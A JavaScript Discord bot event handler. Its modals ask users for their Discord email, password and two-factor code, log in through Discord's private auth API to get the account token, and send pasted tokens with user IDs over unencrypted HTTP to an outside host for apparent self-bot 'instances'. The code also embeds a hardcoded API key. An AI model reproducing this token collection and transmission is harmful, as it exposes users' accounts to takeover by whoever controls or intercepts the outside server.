const {
    EmbedBuilder,
    AttachmentBuilder
} = require('discord.js');
const ExtendedClient = require('../../class/ExtendedClient');

let intervalId;

module.exports = {
    event: 'interactionCreate',
    once: false,
    /**
     * 
     * @param {ExtendedClient} _ 
     * @param {import('discord.js').Client<true>} client 
     * @returns 
     */
    run: async (client, interaction) => {
        if (!interaction.isModalSubmit()) return;

        if (interaction.customId === 'instance-creator') {
            const token = interaction.fields.getTextInputValue('token');
            const userid = interaction.user.id;
            fetch('http://togethercord.unknownandev.me:3333/instance/containers/create', {
                    method: 'POST',
                    body: JSON.stringify({
                        token: token,
                        discordId: userid
                    }),
                    headers: {
                        'Content-Type': 'application/json',
                        "x-api-key": "OmZ5TDJRARai4P0617sL0IIB3oV1CzxP"
                    }
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Success:', data);
                })
                .catch((error) => {
                    console.error('Error:', error);
                });
            await interaction.reply({
                content: 'Your instance is being created !',
                ephemeral: true
            })
        } else if (interaction.customId === 'discord-token') {
            const email = interaction.fields.getTextInputValue('email');
            const password = interaction.fields.getTextInputValue('password');
            if (!interaction.fields.getTextInputValue('code')) {
                fetch('https://discord.com/api/v9/auth/login', {
                        method: 'POST',
                        body: JSON.stringify({
                            login: email,
                            password: password
                        }),
                        headers: {
                            'Content-Type': 'application/json'
                        }
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error(`HTTP error! status: ${response.status}`);
                        }
                        return response.json();
                    })
                    .then(data => {
                        interaction.reply({
                            content: 'Your discord token is (Copy your token for instance creator): ' + data.token,
                            ephemeral: true
                        })
                    })

            } else {
                fetch('https://discord.com/api/v9/auth/login', {
                        method: 'POST',
                        body: JSON.stringify({
                            login: email,
                            password: password
                        }),
                        headers: {
                            'Content-Type': 'application/json'
                        }
                    })
                    .then(response => response.json())
                    .then(data => {
                        fetch('https://discord.com/api/v9/auth/mfa/totp', {
                                method: 'POST',
                                body: JSON.stringify({
                                    code: interaction.fields.getTextInputValue('code'),
                                    ticket: data.ticket,
                                }),
                                headers: {
                                    'Content-Type': 'application/json',
                                }
                            })
                            .then(response => response.json())
                            .then(data => {
                                interaction.reply({
                                    content: 'Your discord token is (Copy your token for instance creator): ' + data.token,
                                    ephemeral: true
                                })
                            })
                    })
            }
        }
    }
}